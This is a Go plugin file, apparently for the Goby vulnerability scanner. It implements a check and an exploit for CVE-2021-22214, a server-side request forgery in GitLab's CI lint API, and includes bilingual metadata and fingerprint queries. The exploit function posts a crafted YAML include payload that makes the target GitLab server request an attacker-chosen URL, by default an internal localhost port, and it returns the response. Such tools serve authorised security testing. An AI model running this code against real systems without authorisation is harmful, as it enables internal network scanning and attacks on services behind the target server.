package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Gitlab CI Lint API SSRF (CVE-2021-22214)",
    "Description": "When requests to the internal network for webhooks are enabled, a server-side request forgery vulnerability in GitLab CE/EE affecting all versions starting from 10.5 was possible to exploit for an unauthenticated attacker even on a GitLab instance where registration is limited",
    "Impact": "Gitlab CI Lint API SSRF (CVE-2021-22214)",
    "Recommendation": "<p>1.The request port can only be web port, and only HTTP and HTTPS requests can be accessed.</p><p>2.Restrict the IP that can't access intranet to prevent attacking intranet.</p><p>3.Mask the returned details.</p><p>4. Upgrade to the latest version.</p>",
    "Product": "GitLab",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Gitlab CI Lint API SSRF 漏洞（CVE-2021-22214）",
            "Description": "<p>GitLab 是由 GitLabInc. 开发的，使用 MIT 许可证的基于网络的一款著名 Git 仓库管理工具。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">GitLab cli link API 存在 SSRF 漏洞。<span style=\"font-size: 16px;\">攻击者可以利用该漏洞扫描外网、服务器所在的内网、本地端口扫描，以及攻击运行在内网或本地的应用程序。</span></span><br></p><p>影响版本：</p><p>GitLab &gt;= 10.5 , &lt;13.10.5</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">GitLab &gt;= 13.11 , &lt;13.11.5</span><br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">GitLab &gt;= 13.12 , &lt;13.12.2</span><br></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可以利用该漏洞扫描外网、服务器所在的内网、本地端口扫描，以及攻击运行在内网或本地的应用程序。</span><br></p>",
            "Recommendation": "<p>当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本：<span style=\"color: var(--primaryFont-color);\"><a href=\"https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/\" target=\"_blank\">https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/</a></span></p>",
            "Product": "GitLab",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Gitlab CI Lint API SSRF (CVE-2021-22214)",
            "Description": "When requests to the internal network for webhooks are enabled, a server-side request forgery vulnerability in GitLab CE/EE affecting all versions starting from 10.5 was possible to exploit for an unauthenticated attacker even on a GitLab instance where registration is limited",
            "Impact": "Gitlab CI Lint API SSRF (CVE-2021-22214)",
            "Recommendation": "<p>1.The request port can only be web port, and only HTTP and HTTPS requests can be accessed.</p><p>2.Restrict the IP that can't access intranet to prevent attacking intranet.</p><p>3.Mask the returned details.</p><p>4. Upgrade to the latest version.</p>",
            "Product": "GitLab",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "(header=\"_gitlab_session\" || banner=\"_gitlab_session\" || body=\"gon.default_issues_tracker\" || body=\"content=\\\"GitLab Community Edition\\\"\" || title=\"Sign in · GitLab\" || body=\"content=\\\"GitLab \" || body=\"<a href=\\\"https://about.gitlab.com/\\\">About GitLab\" || body=\"class=\\\"col-sm-7 brand-holder pull-left\\\"\")",
    "GobyQuery": "(header=\"_gitlab_session\" || banner=\"_gitlab_session\" || body=\"gon.default_issues_tracker\" || body=\"content=\\\"GitLab Community Edition\\\"\" || title=\"Sign in · GitLab\" || body=\"content=\\\"GitLab \" || body=\"<a href=\\\"https://about.gitlab.com/\\\">About GitLab\" || body=\"class=\\\"col-sm-7 brand-holder pull-left\\\"\")",
    "Author": "gobysec@gmail.com",
    "Homepage": "https://about.gitlab.com/",
    "DisclosureDate": "2021-06-17",
    "References": [
        "https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2021-22214"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202106-588"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "http://127.0.0.1:9090",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10219"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/v4/ci/lint"
			payload := `{ "include_merged_yaml": true, "content": "include:\n  remote: http://baidu.com/api/v1/targets?test.yml" }`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = payload
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "merged_yaml") {
					return true
				}
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "json") && strings.Contains(resp.Utf8Html, `{"status":"invalid","errors":`) && strings.Contains(resp.Utf8Html, "does not have valid YAML syntax") || strings.Contains(resp.Utf8Html, "could not be fetched") {
					return true
				}
				if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, `"500 Internal Server Error"`) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/api/v4/ci/lint"
			url := ss.Params["cmd"].(string)
			payload := `{ "include_merged_yaml": true, "content": "include:\n  remote: ` + url + `/api/v1/targets?test.yml" }`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = payload
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
